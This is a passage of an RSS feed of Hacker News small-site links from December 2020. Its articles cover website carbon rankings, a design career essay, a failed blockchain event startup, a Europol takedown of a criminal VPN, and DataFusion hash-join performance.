<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><p>ğŸš€ On a mission to reduce the carbon footprint of the Internet! ğŸŒ</p></div><header><div><nav><a href="https://ecoping.earth/"><p><b>Eco</b>Ping.</p></a><div id="navbarCollapse"><ul><li><a href="https://ecoping.earth/indexes">Indexes</a></li><li><a href="https://ecoping.earth/cdn">CDN</a></li><li><a href="https://ecoping.earth/faqs">FAQs</a></li><li><a href="https://ecoping.earth/pricing">Pricing</a></li><li><a href="https://ecoping.earth/blog">Blog</a></li></ul></div></nav></div></header><main><section><p><h2>We've ranked the UKs Political Parties websites in order of the most eco-friendly and their impact on the planet.</h2></p></section><div><p><svg viewBox="0 0 32 32" width="48" height="48" stroke-width="4" fill="none" stroke="currentcolor" role="img"><title>Loading...</title><circle cx="16" cy="16" r="12" opacity="0.125"></circle><circle cx="16" cy="16" r="12" stroke-dasharray="75.39822368615503" stroke-dashoffset="56.548667764616276"></circle></svg></p><table><thead><tr><th> Rank </th><th>Name</th><th>Site size</th><th>CO2 (g)</th><th>CSS</th><th>JS</th><th>Fonts</th><th>Images</th></tr></thead><tbody></tbody></table><div><div><h2>Want to make your own index?</h2><p>Once you've created an account and logged in. You simply add any sites you would like, and we will start tracking them over time; creating your very own personal index and eco-reports. It's super easy.</p></div></div><p><a href="https://ecoping.earth/indexes">&lt; Back to indexes</a></p></div></main><div><div><div><p>ğŸ•¯ We've gone for dark mode to reduce the</p><!-- --> <p><a href="http://mobileenerlytics.com/dark-mode/" target="_blank" rel="noreferrer noopener">display power drawn</a></p><!-- --><p>of your devices.</p></div></div></div></div></div></div>]]>
            </description>
            <link>https://ecoping.earth/indexes/gb/politicalparties</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515845</guid>
            <pubDate>Wed, 23 Dec 2020 09:08:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sticking to It]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515687">thread link</a>) | @cromulent
<br/>
December 23, 2020 | https://automattic.design/2020/07/09/sticking-to-it/ | <a href="https://web.archive.org/web/*/https://automattic.design/2020/07/09/sticking-to-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>This story is a bit long, but I promise it will be worth it, because it contains the two most important principles every designer must know and take to heart if you intend to do great work anywhere, under almost any circumstances, over the long, long haul of your career.</p>



<h2>The Bronze Age of me</h2>



<p>Early in my career, before the web, when I was in advertising, I had the good fortune to work for legendary creative directors. Theyâ€™d amassed so many awards in their careers that, in the event of Apocalypse, they could have melted their shiny trophies down and lived off the barter value of the metal.</p>



<p>These old men were giants who had once strode the halls of famous agencies, but ours was not famousâ€”at least not for being good. It was a reeking quagmire where great ideas went to die.&nbsp;</p>



<p>Our company knew it had a problem, so it kept hiring brilliant creative leaders, paying them to inspire us demoralized and underpaid young art directors and copywriters, and pitting us against an internal culture that had been designed quite carefully to neutralize and kill the kind of work our ever-changing cast of overlords challenged us to create.&nbsp;</p>



<h2>Let me unpack that.&nbsp;</h2>



<p>Our clients were makers of aspirin and ointments. They owned financially successful chain restaurants. If it ached, if it bled, if it could be satisfied with heaping plates of deeply fried or sauce-drowned food-like products at a family-friendly low price, we probably handled its advertising.&nbsp;</p>



<p>This type of advertising, painstakingly crafted to offend no one, and baited with jingles that stick, unwanted, in the mind, works chiefly by being shown so many times that it canâ€™t help but lodge in the collective consciousness and inexorably drive sales. Think McDonaldâ€™s, but smaller and less â€¦ glamorous.&nbsp;</p>



<p>Saturation is the name of the game, and the agency (like others of its kind) made its money by taking a commission on media placement.&nbsp;<em>Creative was something we gave away free.</em> All we wanted was a cut of the fee broadcasters charged to run the stuff.</p>



<h2>Fear of a creative planet</h2>



<p>A great adâ€”one people talked about, one that potentially risked offending a few peopleâ€”would destroy the cozy and lucrative business relationships on which the agency was founded. The company knew it, and hired skilled account executives to prevent even a moderately good idea from ever reaching the airwaves.</p>



<p><em>Butâ€¦</em></p>



<p>Creative advertising was much talked-about in the popular culture of the time, and our clients asked for it even though they wouldnâ€™t have bought it to save their childrenâ€™s lives. So the agency occasionally had to show a good idea.&nbsp;</p>



<p>Besides, we young art directors and copywriters were idealists, and the agency wasnâ€™t paying us enough to buy our loyalty. They <em>might</em> have distributed the profits more equitably, but the account executives had houses in Darien and ex-spouses to support, so they couldnâ€™t afford to waste any of that money on the troops who did the work the whole thing ran on.</p>



<p>Hence every six months the company hired new creative directors who, we grunts thought, would finally â€œturn this place aroundâ€ and allow us to do the kind of work we dreamed of.</p>



<p>This is how our company came to hire legendary award winners. And although we never sold a great ad, the lesson I learned from them turned out to be the second most important guiding principle of my work as a designer. The first, most important principle, of course, is listen to the customer. But this other principle comes a close second.</p>



<p>The principle these creative directors taught me, chiefly by how they acted, wasâ€¦</p>



<h2>Never give up.</h2>



<p>Never stop trying to do great work. Never get demoralized. Never stop caring.&nbsp;</p>



<p>It sounds simple. It isnâ€™t.</p>



<p>I watched these creative directors and their partners work all night to produce a great idea in spite of all the constraints around the client and product.&nbsp;</p>



<p>I watched them enthusiastically present great work internally. Watched the internal folks sabotage it through fear. Watched my leaders cheerfully go back to the drawing board and come up with something new by the next morning.</p>



<p>I watched them enact this ritual a half-dozen times before the work even got shown to the clients.</p>



<p>I watched the clients shoot it down. I watched my leaders cheerfully get up, put their materials away, come back to the agency, and start over.</p>



<p>Never, not once, did they dial it in. Never did they just shrug their shoulders and say, â€œFine, Iâ€™ll give these people what they want.â€ They listened to the customer but the customer didnâ€™t dictate. The customerâ€™s business problem dictated the creative solution. The solution would work if the customer bought it. If the customer didnâ€™t buy, well, there was another great creative solution out there, if you just worked hard enough to find it.</p>



<p>Even in those extremely backwards times, there were great women creative directors out there, tooâ€”but our agency never hired one, so I only got to meet these men.&nbsp;</p>



<p>They were old menâ€”one of them, who leaned forward with a hunch, and always walked as if he were in painâ€”looked like Moses. I swear he stared through my soul when I tried to go home before 8:00 PM. (We worked in offices then, and you never went home before your boss.) He scared me but I liked him.</p>



<div><p>Once I asked if he missed the â€œgreatâ€ clients he had worked for in the past.&nbsp;</p><p>â€œGreat clients?â€</p><p>â€œLike Volkswagen.â€</p></div>



<p>â€œThey killed just as many good ads as these guys do.â€</p>



<p>â€œWhat did you do?â€</p>



<p>â€œCame up with more ads.â€</p>



<p>The ability to keep coming up with more ads was why this Moses-looking dude had a roomful of shiny trophies, and I did not. If I wanted a career like his, I would have to seek deeply in my soul for the strength and willingness not to give up.</p>



<p>Career aside,<em>&nbsp;if I wanted to create meaningful work,</em>&nbsp;I would need to develop the patience and willingness to watch people kill my darlings, and come back with newer, fresher, better darlings.</p>







<p>I have not done it perfectly, not by a long shot. But keeping a positive attitude when an idea Iâ€™ve fallen in love with gets rejected remains the second most important thing I can do on a daily basis as I practice my current craft.</p>



<p>Both product work and client work are tough. The challenges can seem overwhelming. We bang our heads. We weep. Finally, we and our teammates come up with a solution. This is it! Weâ€™ve done it! Joyfully, we share it. Our lead shoots holes in it. Maybe because it runs afoul of some important learning we didnâ€™t know about. Or because it was tried before we got here and tested badly. Or, sometimes, because they just donâ€™t like it.</p>



<p>We come back with three ideas and none of them are quite right, either.</p>



<p>So we go back and work harder and come up with new stuff.&nbsp;</p>



<p>The well is never dry. We only run out of ideas when we choose to stop doing the work.</p>



<p>The designers I work with here today inspire me on many levels. Their energy, their talent, their sheer skill impresses me. But what blows me away most of all, is that the really good designers stand up to the misfortune of a killed idea. They take away the lesson of what went wrong, and come back with something that much stronger. Or, if not stronger, something different but equally good.</p>



<p>Never give up.</p>



<hr>



<p><em>This article was inspired by a conversation I had with one of our designers, after watching her respond graciously and positively while working on a tough project.</em></p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://automattic.design/2020/07/09/sticking-to-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515687</guid>
            <pubDate>Wed, 23 Dec 2020 08:41:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Somethings are never meant to be invented. The story of BlockEvent]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25515668">thread link</a>) | @rukshn
<br/>
December 23, 2020 | https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/ | <a href="https://web.archive.org/web/*/https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Every few years there comes a technology that people get hyped about, everyone wants to be a specialist in that field because it appears to be the next big thing.</p>
<p>Between 2015-2019 this was largely about bitcoins and blockchain technology. Everyone wanted to be a specialist in blockchain technology. Bitcoin was booming, ICOs were happening to the left and right.</p>
<p>And people were trying to introduce/incorporate blockchain technology into everything they can get their hands on.</p>
<p>Yes sometimes blockchain technology can improve the existing system. However, when you try to introduce blockchain or any other technology into something that doesnâ€™t require it,the results can be disastrous.</p>
<p>This is a story I wanted to write for a very long time, it was about a small startup called BlockEvent. A small startup that wanted to incorporate blockchain technology into event management.</p>
<p><em>Their website blockevent.tk is now not functioning, and I was unable to find a web archive snapshot. A mirror exists on a different domain, please check the footnotes.</em></p>
<p>Blockchain on event management has been there before BlockEvents. Smart ticketing and smart contracts are currently being used to improve the ticketing field and control pricing etc.</p>
<h2>BlockEvent</h2>
<p>BlockEvents wanted to make the whole event process a decentralized mechanism. From user data, to events, to registration, everything was supposed to be â€œdecentralizedâ€ and was â€œnot accessibleâ€ to and â€œnot modifiableâ€ by anyone.</p>
<p>According to the BlockEvent team, </p>
<blockquote><p>We made BlockEvent as a decentralized system. That means no central party can control this booking process and it will work without any third party involvement. </p><p>BlockEvent acts as a bridge between the organizers and the participants where organizers come and create events through our system, and participants can come and book their tickets. </p><p>The whole process is done through Public Blockchain.</p><p>â€¦ </p><p>Using the blockchain for user identity management is a whole new paradigm.</p><cite>BlockEvent on one of their Facebook posts, describing their system. </cite></blockquote>
<p>BlockEvent when initially started mainly hosted monthly blockchain event meetup events. However, their big break came in May 2019, during the annual Google I/O.</p>
<p>Google I/O event is celebrated in Sri Lanka every year, with local tech companies hosting events of their own, with local influencers, while live streaming the Google I/O event.</p>
<p>The selection process is a very completions, hundreds of people compete for few limited number of seats. These events are a good place to network and meet new friends in IT field. Plus you end up getting some cool swags.</p>
<p>In order to be selected to these events you need to show that you are a tech person, usually they check your GitHub page, blog or YouTube channel. And the tech company will select and send an invitation to whom they think are the most suitable to attend their events.</p>
<p>Until 2018, this was done by using a simple Google form or a regular website.</p>
<p>However, in 2019, one of the largest tech and telecom companies in Sri Lanka decided to use BlockEvents to host their Google I/O event.</p>
<p>Getting selected by a big company like them to manage their Google I/O event was big deal, because they host one of the largest I/O events in Sri Lanka. And BlockEvent can leverage this to opportunity to get bigger clients in future.</p>
<p>It was their make or break moment. They had to nail it, and if they failed then for a small startup like BlockEvent, the damage to their reputation is going to hurt them to a point where there is no return.</p>
<h2><strong>Disaster</strong> </h2>
<p>BlockEvent also in their description, said this,</p>
<blockquote><p>To ensure the user data privacy and security, <strong>we are not storing any user credentials or password</strong>[s] <strong>in our database. Even the user emails are stored as a hash. Only the users know their passwords </strong>and that will provide 100% control over your account actions. Even BlockEvent team canâ€™t access your accounts. </p><cite>BlockEvent describing their system in a Facebook post</cite></blockquote>
<p>Since they were storing <strong>everything </strong>in the blockchain, they were not storing even user emails and passwords. This may sound as a good privacy focused system. But this will come to hurt BlockEvent in a very bad way.</p>
<p>Since no one else other than the people in monthly blockchain meetups knew about BlockEvents, like in any other new service, most people registering for the local Google I/O event used either throwaway passwords, or new passwords which they forgot or didnâ€™t save.</p>
<p>This caused large number of people to forget their passwords. If we use a normal database to store user data, with no hashing, they would have been able to reset the user passwords.</p>
<p>However, since everything is stored in blockchain, and everything were hashed, this meant that there is no way to reset a user password. </p>
<p>This led to large number of people being locked out of their accounts, unable to create new accounts with the existing emails, and BlockEvent team unable to reset passwords.</p>
<p>This caused a wave of negative reviews on BlockEvent Facebook page and on social media. Some users demanded the organizers to go back to the old system of using a Google form for user registration.</p>
<p>BlockEvent finally responded to their users, they had no way to reseat the password. Unless you remember the password and login, or you are permanently locked out from using the account.</p>
<figure><img data-attachment-id="75" data-permalink="https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/img_0045/" data-orig-file="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?fit=1536%2C1517&amp;ssl=1" data-orig-size="1536,1517" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_0045" data-image-description="" data-medium-file="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?fit=300%2C296&amp;ssl=1" data-large-file="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?fit=1024%2C1011&amp;ssl=1" loading="lazy" width="1024" height="1011" src="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;ssl=1" alt="" srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;ssl=1 1024w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=300%2C296&amp;ssl=1 300w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=768%2C759&amp;ssl=1 768w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?w=1536&amp;ssl=1 1536w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;ssl=1 1024w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=300%2C296&amp;ssl=1 300w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=768%2C759&amp;ssl=1 768w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?w=1536&amp;ssl=1 1536w" data-lazy-src="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Large number of people were locked out from their accounts, unable to reset their passwords.</figcaption></figure>
<blockquote><p>Due to the rules of decentralization, we canâ€™t reset your passwords as we are giving priority to user data and security. We already communicated this on registration [on sign up]. </p><p>To ensure the decentralization the same rule is applied by many other [b]lockchain projects and products all over the world.</p><cite>BlockEvent responding to the events on a Facebook page</cite></blockquote>
<p>BlockEvent also asked participants to send their personal details on Facebook and via a Google form, so they can manually arrange a way to send the gift pack to the participants.</p>
<p>Some of the users accused the selection process was also flawed and complained that some of the people who were less qualified to attend the event were selected over them.</p>
<p>All this led to irreplaceable damage on BlockEvent, and the Google I/O event didnâ€™t happen due to the Easter Sunday bombings. </p>
<p>BlockEvent went into hiatus few months later, all thought they never mentioned that they are shutting down, their website went offline once their domain name expired. Possibly signaling the end of the startup that hoped to decentralize how we manage identity online.</p>
<h2><strong>Conclusion</strong> </h2>
<p>The title of the post is <strong>â€œSomethings are never meant to be inventedâ€</strong>.</p>
<p>No matter how utopian the idea may sound like, guaranteeing 100% user privacy with everything stored on a blockchain, not even giving access to user email to the creators can have its own drawbacks.</p>
<p>And since we are all humans, and we all tend to make mistakes, there has to be a fail safe mechanism, that will keep things in check and can undo the mistakes when we make one.</p>
<p>Also a single use password is a very bad idea, not only that users can lose their passwords, but also in the event of a data breach, user handing over the password to a third party by a mistake, how can the service reset the passwords? There are so many scenarios where things can go wrong.</p>
<p>May be an idea like BlockEvent were never meant to be invented.</p>
<p><strong>The currently hyped up technology may not be ideal for your system and instead a time tested solution may be the answer that youâ€™re looking for.</strong></p>
<h2>My thoughts</h2>
<p>When it comes to blockchain and cryptocurrency, Iâ€™m still open minded, at the same time but skeptical. Iâ€™m not yet ready to invest or build something on blockchain.</p>
<p>I still find it difficult to fully understand the idea of blockchain, what makes it different from a decentralized git repository? Why Git is easy to implement but blockchain is hard? </p>
<p>When it comes to BlockEvents, I think what they did was store the email and password both hashed on the blockchain, and when a user logs in, they match the submitted hashed email and hashed passwords against whatâ€™s stored in the blockchain, like we do it in a normal login system using a database, except the fact that we donâ€™t hash the emails.</p>
<h4>Notes</h4>
<p><em>Iâ€™m not a blockchain expert, so I donâ€™t know the exact reason why BlockEvent was not able to reset the passwords.</em></p>
<p><em>Was it because they didnâ€™t know the emails because they were hashed, or was it because once you put some information to the blockchain it is immutable, or was it due to both?</em></p>
<p><em>At the time when I saw this in 2019, I thought it was due to the fact that data is immutable on the blockchain, but now at the time of writing I feel it was due to the fact that the emails were stored on the blockchain in hashed format.</em></p>
<p><em>I also donâ€™t know what really caused so many people to lose their password, my assumption is that they used a throwaway password, or a new password which they forgot. But still this number of users getting locked out is still unexplained.</em></p>
<p><em>After further Googling I was able to find a mirror of the original website on another domain name http://blockevent.ml</em></p>
<p><em>I tried logging in using my BlockEvent account, but I also have forgotten my BlockEvent password, and now Iâ€™m also locked out.</em></p>
<ul><li>BlockEvent password forgot requests â€“ <a href="https://m.facebook.com/pg/blockevent.live/reviews/">https://m.facebook.com/pg/blockevent.live/reviews/</a></li></ul>
</div></div>]]>
            </description>
            <link>https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515668</guid>
            <pubDate>Wed, 23 Dec 2020 08:36:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Footmouse]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515655">thread link</a>) | @iforgottherest
<br/>
December 23, 2020 | https://www.dossierd.nl/ap_voetmuis_eng.html | <a href="https://web.archive.org/web/*/https://www.dossierd.nl/ap_voetmuis_eng.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.dossierd.nl/ap_voetmuis_eng.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515655</guid>
            <pubDate>Wed, 23 Dec 2020 08:31:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cybercriminalsâ€™ Favourite VPN Taken Down in Global Action]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515644">thread link</a>) | @doener
<br/>
December 23, 2020 | https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action | <a href="https://web.archive.org/web/*/https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Law enforcement wiretapped the very service used by criminals to evade interception</p><div><p>The virtual private network (VPN) Safe-Inet used by the worldâ€™s foremost cybercriminals has been taken down yesterday in a coordinated law enforcement action led by the German Reutlingen Police Headquarters together with Europol and law enforcement agencies from around the world.&nbsp;</p>
<p>The Safe-Inet service was shut down and its infrastructure seized in Germany, the Netherlands, Switzerland, France and the United States. The servers were taken down, and a splash page prepared by Europol was put up online after the domain seizures. This coordinated takedown was carried out in the framework of the <a href="https://www.europol.europa.eu/empact">European Multidisciplinary Platform Against Criminal Threats (EMPACT)</a>.&nbsp;</p>
<h3>Turning the table on the criminals&nbsp;</h3>
<p>Active for over a decade, Safe-Inet was being used by some of the worldâ€™s biggest cybercriminals, such as the ransomware operators responsible for ransomware, E-skimming breaches and other forms of serious cybercrime.&nbsp;</p>
<p>This VPN service was sold at a high price to the criminal underworld as one of the best tools available to avoid law enforcement interception, offering up to 5 layers of anonymous VPN connections.</p>
<p>Law enforcement were able to identify some 250 companies worldwide which were being spied on by the criminals using this VPN. These companies were subsequently warned of an imminent ransomware attack against their systems, allowing them to take measures to protect themselves against such an attack.<br>
The service has now been rendered inaccessible.&nbsp;</p>
<p>Investigations are ongoing in a number of countries to identify and take action against some of Safe-Inetâ€™s users. &nbsp;</p>
<h3>International cyber sweep&nbsp;</h3>
<p>International police cooperation was central to the success of this investigation as the critical infrastructure was scattered across the world.</p>
<p>Europolâ€™s <a href="https://www.europol.europa.eu/about-europol/european-cybercrime-centre-ec3">European Cybercrime Centre (EC3) </a>supported the investigation from the onset, bringing together all the involved countries to establish a joint strategy and to organise the intensive exchange of information and evidence needed to prepare for the final phase of the takedown.&nbsp;</p>
<p>The <strong>Police President of the Reutlingen Police Headquarters, Udo Vogel</strong>, said:</p>
<blockquote><p>The investigation carried out by our cybercrime specialists has resulted in such a success thanks to the excellent international cooperation with partners worldwide. The results show that law enforcement authorities are equally as well connected as criminals.&nbsp;</p>
</blockquote>
<p>The <strong>Head of Europolâ€™s European Cybercrime Centre, Edvardas Å ileris</strong>, said:</p>
<blockquote><p>The &nbsp;strong working relationship fostered by Europol between the investigators involved in this case on either side of the world was central in bringing down this service. &nbsp;Criminals can run but they cannot hide from law enforcement, and we will continue working tirelessly together with our partners to outsmart them.</p>
</blockquote>
<h3>Participating agencies</h3>
<ul><li><strong>Germany:</strong> Reutlingen Police Headquarters (PolizeiprÃ¤sidium Reutlingen)</li>
<li><strong>The Netherlands: </strong>National Police (Politie)</li>
<li><strong>Switzerland:</strong> Cantonal Police of Argovia (Kantonspolizei Aargau)&nbsp;</li>
<li><strong>United States: </strong>&nbsp;Federal Bureau of Investigation</li>
<li><strong>France: </strong>Judicial Police (Direction Centrale de la Police Judiciaire)</li>
<li><strong>Europol:</strong> European Cybercrime Centre (EC3)&nbsp;</li>
</ul></div></div>]]>
            </description>
            <link>https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515644</guid>
            <pubDate>Wed, 23 Dec 2020 08:30:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making joins faster in DataFusion based on table statistics]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515144">thread link</a>) | @hashjoiner
<br/>
December 22, 2020 | https://godatadriven.com/blog/making-joins-faster-in-datafusion-based-on-table-statistics/ | <a href="https://web.archive.org/web/*/https://godatadriven.com/blog/making-joins-faster-in-datafusion-based-on-table-statistics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

                        
            
            

            <!-- //category -->


            <p><a href="https://github.com/apache/arrow/tree/master/rust/datafusion" title="DataFusion">DataFusion</a> is a new data processing engine written in the Rust programming language. It provides a SQL and a DataFrame API to transform datasets from multiple sources and in multiple file formats, similar to Spark. DataFusion uses <a href="https://arrow.apache.org/" title="Apache Arrow">Apache Arrow</a> as the underlying memory model, an efficient in-memory columnar format. This choice has significant performance benefits compared to a row-level representation such as used by <a href="https://spark.apache.org/" title="Apache Spark">Apache Spark</a>.</p>
<p>As other databases &amp; engines have shown, performing analytical (<a href="https://en.wikipedia.org/wiki/Online_analytical_processing" title="OLAP">OLAP</a>) queries on a <a href="http://cidrdb.org/cidr2005/papers/P19.pdf" title="columnar rather than row-by-row format">columnar rather than row-by-row format</a> can significantly speed up query execution, often by 20x or more!  When processing is done row-by-row, a lot of complex operations are being executed in the inner loop when executing a query, such as interpreting an expression, computing the result and going to the next value in the row, dealing with completely different operations and data types. In contrast, when operating on a columnar level, the inner loop can be very simple, making it easy for the CPU to see what instructions will likely run next and utilize various forms of <a href="https://en.m.wikipedia.org/wiki/Instruction-level_parallelism" title="instruction level parallelism">instruction level parallelism</a>. Modern CPUs can run hundreds of instructions at the same time, even on one core. Code can be written to use available <a href="https://en.m.wikipedia.org/wiki/SIMD" title="SIMD">SIMD</a> instructions, operating at multiple inputs at the same time to speed up things even more.<img src="https://arrow.apache.org/img/simd.png" alt="Arrow Format" title="Arrow Format"></p>
<p><em>Image source: Arrow website</em></p>
<p>DataFusion is implemented in <a href="https://www.rust-lang.org/" title="Rust">Rust</a>, a language that is both fast and has control over memory while still providing memory safety, making it a very suitable language to write performant and correct code. Compared to Java running on the JVM, systems written in Rust tend to use much less memory. This saves costs and makes it possible to run bigger workloads on a single machine! An earlier benchmark of <a href="https://ballistacompute.org/" title="Ballista">Ballista</a>, a distributed engine in Rust utilizing DataFusion, <a href="https://andygrove.io/rust_bigdata_benchmarks/" title="shows">shows</a> that it can do with about 10x less memory on small to medium sized datasets. The JVM needs at least 1 GB for the heap. Spark also keeps intermediate results in memory between stages. DataFusion can stream more in batches of records, keeping memory usage low. DataFusion also benefits from Arrow format, which stores data types such as strings in an efficient way.</p>
<p>Numerous performance improvements have been added in the Rust version of Arrow and DataFusion between version 2 and 3 which is planned for release in January.<br>
For example, I have contributed a<a href="https://github.com/apache/arrow/pull/8781" title=" faster CSV parser"> faster CSV parser</a> and <a href="https://github.com/apache/arrow/pull/8863" title="improved">improved</a> the performance of <a href="https://github.com/apache/arrow/pull/8832" title="hashing">hashing</a>. Kernels have been improved that provide implementations of often-used calculations, such as <a href="https://github.com/apache/arrow/pull/8800" title="sum">sum</a>, filter, <a href="https://github.com/apache/arrow/pull/8803" title="taking multiple elements">taking multiple elements</a> of an array by index (also called indexing or gathering), and <a href="https://github.com/apache/arrow/pull/8837" title="more">more</a>. As DataFusion and Arrow are relatively new projects, there is still a lot of room for further improvement.</p>
<p>Recently, I <a href="https://github.com/apache/arrow/pull/8961" title="added a new optimization pass to">added a new optimization pass to</a> DataFusion to make hash joins faster. A hash join is a popular algorithm to implement joins in a fast way. The hash join algorithm is divided in a <em>build</em> stage and a <em>probe</em> stage. The <em>build</em> (or left side) stage creates a lookup table to map the keys in the join condition to a row index. The <em>probe</em> (right side) stage looks up the items in the lookup table by key and adds the matching rows to the end result if there is a match.<br>
It is faster to create a lookup table for the smallest table. This will avoid work for creating the lookup table for more rows, as well as not having the requirement to keep the bigger table in memory. For the optimization to be possible, we need to know the number of rows of both sources before executing the query. Luckily, for Parquet and in-memory tables this can be calculated based on the metadata. This information has been exposed recently in DataFusion.</p>
<h4 id="implementation-results">Implementation / Results</h4>
<p>The optimization is implemented as an optimization pass on the logical plan, an abstract representation of a query. When the left side of a join has more rows than the right side, the order and join type are swapped. If the left side already is smaller, the order is kept intact.<br>
While testing the optimization something unexpected happened: When the optimization rule was used to change the order, the query performed worse than the original.<br>
While studying the implementation of the hash join in DataFusion, it became clear that next to the left side of a join, the right part creates a lookup table as well!<br>
I <a href="https://github.com/apache/arrow/pull/8965" title="changed the implementation">changed the implementation</a> to only use the probe side to look up items on the left side and simplified the implementation, removing some other inefficiencies. Now queries having joins run much faster than before. This can be demonstrated on two <a href="http://www.tpc.org/tpch/" title="TCP-H">TCP-H</a> benchmark queries that include a join and are supported in DataFusion. Notably, TCP-H 5 is now 16x faster and TCP-H 12 more than 4 times faster.<br>
I ran the <a href="https://github.com/apache/arrow/tree/master/rust/benchmarks" title="TPC-H">TPC-H</a> benchmarks using the command: <code>cargo run  --release --bin tpch -- benchmark --iterations 10 --path <location> --format tbl --query 12 --batch-size 20000 --concurrency 10 -m </location></code> and averaged the results.</p>
<p><img src="https://godatadriven.com/wp-content/uploads/2020/12/improved_join-900x629.png" alt=""></p>
<p>When the optimization rule is applied and combined with the improved hash join implementation, it makes the queries where the rule can be applied run faster, in this case reducing the total execution time by about 16%. For more imbalanced joins, the speedup can be greater. The data contains roughly 6 million line items (originally on the left side of the join) and 1.5 million orders (on the right side).</p>
<p><img src="https://godatadriven.com/wp-content/uploads/2020/12/carbon-7-900x834.png" alt=""></p>
<p><img src="https://godatadriven.com/wp-content/uploads/2020/12/join_build_probe_order-900x542.png" alt=""></p>
<h4 id="conclusion">Conclusion</h4>
<p>Statistics are a promising way to accelerate queries. In the future, a lot more optimizations could be added that benefit from table statistics. Many statistics however are known only after queries run, so in the future it would be interesting to add a form of <a href="https://databricks.com/blog/2020/05/29/adaptive-query-execution-speeding-up-spark-sql-at-runtime.html" title="Adaptive Query Execution">Adaptive Query Execution</a> as well.<br>
Hash joins could be further improved, for example by using <a href="https://www.cockroachlabs.com/blog/vectorized-hash-joiner/" title="vectorized hashing">vectorized hashing</a>, which can also be used for hash aggregations which are used in GROUP BY queries.</p>
<p>I am personally very excited for what the future of Arrow and DataFusion brings and making Rust and Apache Arrow accelerate data analytics &amp; data science.</p>

            

        </article><section>
            <div>
                <div>
                    <h3>Subscribe to our newsletter</h3>
                    <p>Stay up to date on the latest insights and
                        best-practices by registering for the GoDataDriven newsletter.</p>
                </div>
                            </div>
        </section></div>]]>
            </description>
            <link>https://godatadriven.com/blog/making-joins-faster-in-datafusion-based-on-table-statistics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515144</guid>
            <pubDate>Wed, 23 Dec 2020 06:53:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell and Elm: How to initialize data from IHP directly to Elm]]>
            </title>
            <description>
<![CDATA[
